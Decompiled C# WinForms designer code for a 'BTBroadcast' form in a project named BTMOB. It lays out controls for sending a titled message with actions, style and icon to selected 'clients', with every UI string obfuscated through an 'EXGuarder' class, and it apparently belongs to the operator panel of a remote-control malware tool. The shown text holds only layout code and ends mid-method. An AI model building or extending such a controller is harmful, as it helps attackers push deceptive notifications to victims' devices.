using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class BTBroadcast : basestyle
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("comboactions")]
	private DrakeUIComboBox _comboactions;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("combostyles")]
	private DrakeUIComboBox _combostyles;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGVC")]
	private DataGridView _DGVC;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("sndbtn")]
	private DrakeUIButtonIcon _sndbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("selectico")]
	private DrakeUIButtonIcon _selectico;

	private string iconpath;

	public List<BTClient> listclients;

	public List<string> Selectedids;

	[field: AccessedThroughProperty("TableLayoutPanel1")]
	internal virtual TableLayoutPanel TableLayoutPanel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("titlebrod")]
	internal virtual DrakeUITextBox titlebrod
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("titletxt")]
	internal virtual Label titletxt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("msgtext")]
	internal virtual DrakeUITextBox msgtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox comboactions
	{
		[CompilerGenerated]
		get
		{
			return _comboactions;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = comboactions_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _comboactions;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_comboactions = value;
			drakeUIComboBox = _comboactions;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("actoninput")]
	internal virtual DrakeUITextBox actoninput
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox combostyles
	{
		[CompilerGenerated]
		get
		{
			return _combostyles;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = combostyles_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _combostyles;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_combostyles = value;
			drakeUIComboBox = _combostyles;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("panelicon")]
	internal virtual Panel panelicon
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W9")]
	internal virtual DrakeWidth_W DrakeWidth_W9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("brodicon")]
	internal virtual PictureBox brodicon
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual DataGridView DGVC
	{
		[CompilerGenerated]
		get
		{
			return _DGVC;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellPaintingEventHandler value2 = DataGridView1_CellPainting;
			DataGridView dataGridView = _DGVC;
			if (dataGridView != null)
			{
				dataGridView.CellPainting -= value2;
			}
			_DGVC = value;
			dataGridView = _DGVC;
			if (dataGridView != null)
			{
				dataGridView.CellPainting += value2;
			}
		}
	}

	[field: AccessedThroughProperty("slctclum")]
	internal virtual DataGridViewCheckBoxColumn slctclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("apicoclm")]
	internal virtual DataGridViewImageColumn apicoclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numnamclm")]
	internal virtual DataGridViewTextBoxColumn numnamclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon sndbtn
	{
		[CompilerGenerated]
		get
		{
			return _sndbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _sndbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_sndbtn = value;
			drakeUIButtonIcon = _sndbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon selectico
	{
		[CompilerGenerated]
		get
		{
			return _selectico;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _selectico;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_selectico = value;
			drakeUIButtonIcon = _selectico;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W10a")]
	internal virtual DrakeWidth_W DrakeWidth_W10a
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.BTBroadcast));
		this.TableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.panelicon = new System.Windows.Forms.Panel();
		this.selectico = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.brodicon = new System.Windows.Forms.PictureBox();
		this.Label4 = new System.Windows.Forms.Label();
		this.DrakeWidth_W9 = new DrakeUI.Framework.DrakeWidth_W();
		this.combostyles = new DrakeUI.Framework.DrakeUIComboBox();
		this.Label3 = new System.Windows.Forms.Label();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.actoninput = new DrakeUI.Framework.DrakeUITextBox();
		this.DrakeWidth_W10a = new DrakeUI.Framework.DrakeWidth_W();
		this.comboactions = new DrakeUI.Framework.DrakeUIComboBox();
		this.Label2 = new System.Windows.Forms.Label();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.msgtext = new DrakeUI.Framework.DrakeUITextBox();
		this.Label1 = new System.Windows.Forms.Label();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.titlebrod = new DrakeUI.Framework.DrakeUITextBox();
		this.titletxt = new System.Windows.Forms.Label();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.DGVC = new System.Windows.Forms.DataGridView();
		this.slctclum = new System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.apicoclm = new System.Windows.Forms.DataGridViewImageColumn();
		this.numnamclm = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Panel5 = new System.Windows.Forms.Panel();
		this.sndbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.TableLayoutPanel1.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.panelicon.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.brodicon).BeginInit();
		this.Panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGVC).BeginInit();
		this.Panel5.SuspendLayout();
		base.SuspendLayout();
		this.myscr.Location = new System.Drawing.Point(63, 5);
		this.myscr.Visible = false;
		this.pinbtn.Location = new System.Drawing.Point(726, 5);
		this.minibtn.Location = new System.Drawing.Point(768, 5);
		this.closbtn.Location = new System.Drawing.Point(810, 5);
		this.myico.Image = BTMOB.My.Resources.Resources.cell_tower_24dp_FFFFFF_FILL1_wght100_GRAD0_opsz24;
		this.myico.Size = new System.Drawing.Size(48, 25);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(842, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(852, 26);
		this.TableLayoutPanel1.ColumnCount = 2;
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 39.64264f));
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 60.35736f));
		this.TableLayoutPanel1.Controls.Add(this.Panel4, 0, 0);
		this.TableLayoutPanel1.Controls.Add(this.Panel3, 1, 0);
		this.TableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TableLayoutPanel1.Location = new System.Drawing.Point(2, 64);
		this.TableLayoutPanel1.Name = EXGuarder._2C287476;
		this.TableLayoutPanel1.RowCount = 1;
		this.TableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
		this.TableLayoutPanel1.Size = new System.Drawing.Size(852, 686);
		this.TableLayoutPanel1.TabIndex = 40;
		this.Panel4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel4.Controls.Add(this.panelicon);
		this.Panel4.Controls.Add(this.DrakeWidth_W9);
		this.Panel4.Controls.Add(this.combostyles);
		this.Panel4.Controls.Add(this.Label3);
		this.Panel4.Controls.Add(this.DrakeWidth_W3);
		this.Panel4.Controls.Add(this.actoninput);
		this.Panel4.Controls.Add(this.DrakeWidth_W10a);
		this.Panel4.Controls.Add(this.comboactions);
		this.Panel4.Controls.Add(this.Label2);
		this.Panel4.Controls.Add(this.DrakeWidth_W4);
		this.Panel4.Controls.Add(this.msgtext);
		this.Panel4.Controls.Add(this.Label1);
		this.Panel4.Controls.Add(this.DrakeWidth_W2);
		this.Panel4.Controls.Add(this.titlebrod);
		this.Panel4.Controls.Add(this.titletxt);
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel4.Location = new System.Drawing.Point(3, 3);
		this.Panel4.Name = EXGuarder._09691536;
		this.Panel4.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.Panel4.Size = new System.Drawing.Size(331, 680);
		this.Panel4.TabIndex = 1;
		this.panelicon.Controls.Add(this.selectico);
		this.panelicon.Controls.Add(this.brodicon);
		this.panelicon.Controls.Add(this.Label4);
		this.panelicon.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panelicon.Location = new System.Drawing.Point(10, 490);
		this.panelicon.Name = EXGuarder._7628124F;
		this.panelicon.Padding = new System.Windows.Forms.Padding(10, 9, 10, 9);
		this.panelicon.Size = new System.Drawing.Size(311, 181);
		this.panelicon.TabIndex = 58;
		this.panelicon.Visible = false;
		this.selectico.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.selectico.Cursor = System.Windows.Forms.Cursors.Hand;
		this.selectico.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.selectico.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.selectico.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.selectico.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.selectico.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.selectico.Font = new System.Drawing.Font(EXGuarder._5F75121F, 10f);
		this.selectico.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.selectico.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.selectico.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.selectico.Location = new System.Drawing.Point(206, 101);
		this.selectico.Name = EXGuarder._77071C18;
		this.selectico.Radius = 15;
		this.selectico.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.selectico.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.selectico.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.selectico.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.selectico.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.selectico.Size = new System.Drawing.Size(92, 47);
		this.selectico.Style = DrakeUI.Framework.UIStyle.Custom;
		this.selectico.Symbol = 61543;
		this.selectico.SymbolSize = 20;
		this.selectico.TabIndex = 61;
		this.selectico.Text = EXGuarder._64381C18;
		this.brodicon.Location = new System.Drawing.Point(13, 101);
		this.brodicon.Name = EXGuarder._3F2A3353;
		this.brodicon.Size = new System.Drawing.Size(66, 47);
		this.brodicon.TabIndex = 59;
		this.brodicon.TabStop = false;
		this.Label4.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label4.Font = new System.Drawing.Font(EXGuarder._5F75121F, 10f, System.Drawing.FontStyle.Bold);
		this.Label4.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.Label4.Location = new System.Drawing.Point(10, 9);
		this.Label4.Name = EXGuarder._65576777;
		this.Label4.Size = new System.Drawing.Size(291, 72);
		this.Label4.TabIndex = 58;
		this.Label4.Text = EXGuarder._240E151D;
		this.Label4.TextAlign = System.Drawing.ContentAlignment.BottomCenter;
		this.DrakeWidth_W9.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W9.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W9.Location = new System.Drawing.Point(10, 446);
		this.DrakeWidth_W9.Name = EXGuarder._38592663;
		this.DrakeWidth_W9.Size = new System.Drawing.Size(311, 44);
		this.DrakeWidth_W9.TabIndex = 56;
		this.combostyles.Dock = System.Windows.Forms.DockStyle.Top;
		this.combostyles.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combostyles.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.combostyles.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f);
		this.combostyles.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.combostyles.Items.AddRange(new object[2]
		{
			EXGuarder._4B1E4500,
			EXGuarder._24574F0C
		});
		this.combostyles.Location = new System.Drawing.Point(10, 421);
		this.combostyles.Margin = new System.Windows.Forms.Padding(4);
		this.combostyles.MinimumSize = new System.Drawing.Size(56, 0);
		this.combostyles.Name = EXGuarder._65415A74;
		this.combostyles.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combostyles.Radius = 15;
		this.combostyles.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.combostyles.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combostyles.Size = new System.Drawing.Size(311, 25);
		this.combostyles.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combostyles.TabIndex = 55;
		this.combostyles.Text = EXGuarder._4B1E4500;
		this.combostyles.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label3.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f, System.Drawing.FontStyle.Bold);
		this.Label3.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.Label3.Location = new System.Drawing.Point(10, 378);
		this.Label3.Name = EXGuarder._02575F4C;
		this.Label3.Size = new System.Drawing.Size(311, 43);
		this.Label3.TabIndex = 54;
		this.Label3.Text = EXGuarder._0A317621;
		this.Label3.TextAlign = System.Drawing.ContentAlignment.BottomLeft;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(10, 369);
		this.DrakeWidth_W3.Name = EXGuarder._1D305739;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(311, 9);
		this.DrakeWidth_W3.TabIndex = 53;
		this.actoninput.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.actoninput.Dock = System.Windows.Forms.DockStyle.Top;
		this.actoninput.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.actoninput.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.actoninput.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f);
		this.actoninput.ForeColor = System.Drawing.Color.White;
		this.actoninput.Location = new System.Drawing.Point(10, 344);
		this.actoninput.Margin = new System.Windows.Forms.Padding(4);
		this.actoninput.Maximum = 2147483647.0;
		this.actoninput.Minimum = -2147483648.0;
		this.actoninput.Name = EXGuarder._1914595D;
		this.actoninput.Padding = new System.Windows.Forms.Padding(4);
		this.actoninput.Radius = 15;
		this.actoninput.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.actoninput.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.actoninput.Size = new System.Drawing.Size(311, 25);
		this.actoninput.Style = DrakeUI.Framework.UIStyle.Custom;
		this.actoninput.TabIndex = 52;
		this.actoninput.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.actoninput.Visible = false;
		this.actoninput.Watermark = EXGuarder._2F166900;
		this.DrakeWidth_W10a.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W10a.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W10a.Location = new System.Drawing.Point(10, 340);
		this.DrakeWidth_W10a.Name = EXGuarder._68666813;
		this.DrakeWidth_W10a.Size = new System.Drawing.Size(311, 4);
		this.DrakeWidth_W10a.TabIndex = 59;
		this.comboactions.Dock = System.Windows.Forms.DockStyle.Top;
		this.comboactions.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboactions.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.comboactions.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f);
		this.comboactions.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.comboactions.Items.AddRange(new object[3]
		{
			EXGuarder._1F5E3515,
			EXGuarder._7145153F,
			EXGuarder._321C6505
		});
		this.comboactions.Location = new System.Drawing.Point(10, 315);
		this.comboactions.Margin = new System.Windows.Forms.Padding(4);
		this.comboactions.MinimumSize = new System.Drawing.Size(56, 0);
		this.comboactions.Name = EXGuarder._715A5827;
		this.comboactions.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboactions.Radius = 15;
		this.comboactions.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comboactions.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboactions.Size = new System.Drawing.Size(311, 25);
		this.comboactions.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboactions.TabIndex = 49;
		this.comboactions.Text = EXGuarder._1F5E3515;
		this.comboactions.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label2.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f, System.Drawing.FontStyle.Bold);
		this.Label2.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.Label2.Location = new System.Drawing.Point(10, 278);
		this.Label2.Name = EXGuarder._17533237;
		this.Label2.Size = new System.Drawing.Size(311, 37);
		this.Label2.TabIndex = 46;
		this.Label2.Text = EXGuarder._592B2A22;
		this.Label2.TextAlign = System.Drawing.ContentAlignment.BottomLeft;
		this.DrakeWidth_W4.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W4.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W4.Location = new System.Drawing.Point(10, 269);
		this.DrakeWidth_W4.Name = EXGuarder._3C236D59;
		this.DrakeWidth_W4.Size = new System.Drawing.Size(311, 9);
		this.DrakeWidth_W4.TabIndex = 47;
		this.msgtext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.msgtext.Dock = System.Windows.Forms.DockStyle.Top;
		this.msgtext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.msgtext.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f);
		this.msgtext.ForeColor = System.Drawing.Color.White;
		this.msgtext.Location = new System.Drawing.Point(10, 117);
		this.msgtext.Margin = new System.Windows.Forms.Padding(4);
		this.msgtext.Maximum = 2147483647.0;
		this.msgtext.Minimum = -2147483648.0;
		this.msgtext.Multiline = true;
		this.msgtext.Name = EXGuarder._2F353308;
		this.msgtext.Padding = new System.Windows.Forms.Padding(4);
		this.msgtext.Radius = 15;
		this.msgtext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.msgtext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.msgtext.Size = new System.Drawing.Size(311, 152);
		this.msgtext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.msgtext.StyleCustomMode = true;
		this.msgtext.TabIndex = 45;
		this.msgtext.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
		this.msgtext.Watermark = EXGuarder._07084935;
		this.Label1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label1.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f, System.Drawing.FontStyle.Bold);
		this.Label1.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.Label1.Location = new System.Drawing.Point(10, 80);
		this.Label1.Name = EXGuarder._38796657;
		this.Label1.Size = new System.Drawing.Size(311, 37);
		this.Label1.TabIndex = 44;
		this.Label1.Text = EXGuarder._632F233A;
		this.Label1.TextAlign = System.Drawing.ContentAlignment.BottomLeft;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(10, 71);
		this.DrakeWidth_W2.Name = EXGuarder._4D472A21;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(311, 9);
		this.DrakeWidth_W2.TabIndex = 48;
		this.titlebrod.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.titlebrod.Dock = System.Windows.Forms.DockStyle.Top;
		this.titlebrod.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.titlebrod.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.titlebrod.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f);
		this.titlebrod.ForeColor = System.Drawing.Color.White;
		this.titlebrod.Location = new System.Drawing.Point(10, 46);
		this.titlebrod.Margin = new System.Windows.Forms.Padding(4);
		this.titlebrod.Maximum = 2147483647.0;
		this.titlebrod.Minimum = -2147483648.0;
		this.titlebrod.Name = EXGuarder._22176174;
		this.titlebrod.Padding = new System.Windows.Forms.Padding(4);
		this.titlebrod.Radius = 15;
		this.titlebrod.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.titlebrod.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.titlebrod.Size = new System.Drawing.Size(311, 25);
		this.titlebrod.Style = DrakeUI.Framework.UIStyle.Custom;
		this.titlebrod.TabIndex = 19;
		this.titlebrod.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.titlebrod.Watermark = EXGuarder._62220732;
		this.titletxt.Dock = System.Windows.Forms.DockStyle.Top;
		this.titletxt.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f, System.Drawing.FontStyle.Bold);
		this.titletxt.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.titletxt.Location = new System.Drawing.Point(10, 9);
		this.titletxt.Name = EXGuarder._4E051807;
		this.titletxt.Size = new System.Drawing.Size(311, 37);
		this.titletxt.TabIndex = 43;
		this.titletxt.Text = EXGuarder._6D182C20;
		this.titletxt.TextAlign = System.Drawing.ContentAlignment.BottomLeft;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.DGVC);
		this.Panel3.Controls.Add(this.Panel5);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(340, 3);
		this.Panel3.Name = EXGuarder._29520D4D;
		this.Panel3.Padding = new System.Windows.Forms.Padding(9);
		this.Panel3.Size = new System.Drawing.Size(509, 680);
		this.Panel3.TabIndex = 0;
		this.DGVC.AllowUserToAddRows = false;
		this.DGVC.AllowUserToDeleteRows = false;
		this.DGVC.AllowUserToResizeColumns = false;
		this.DGVC.AllowUserToResizeRows = false;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGVC.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVC.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVC.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGVC.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGVC.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGVC.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		this.DGVC.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle2.Font = new System.Drawing.Font(EXGuarder._5F75121F, 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGVC.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVC.ColumnHeadersVisible = false;
		this.DGVC.Columns.AddRange(this.slctclum, this.apicoclm, this.numnamclm);
